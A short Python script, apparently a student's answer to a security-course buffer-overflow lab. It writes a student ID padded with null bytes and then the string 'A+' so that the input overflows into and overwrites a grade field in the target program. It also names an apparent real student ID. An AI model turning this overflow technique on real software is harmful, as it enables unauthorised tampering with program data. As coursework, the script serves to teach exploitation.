#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

'''
1234567890-qwertyuiopasdfghjklzxcvbnm
->
Hi 1234567890-qwertyuiopasdfghjklzxcvbnm! Your grade is -qwertyuiopasdfghjklzxcvbnm.
'''

# Your code here
pad = 10
netid = 'zhiqic2'
sys.stdout.buffer.write((netid).encode())
sys.stdout.buffer.write(b'\x00'*(pad-len(netid)))
sys.stdout.buffer.write(b'A+')
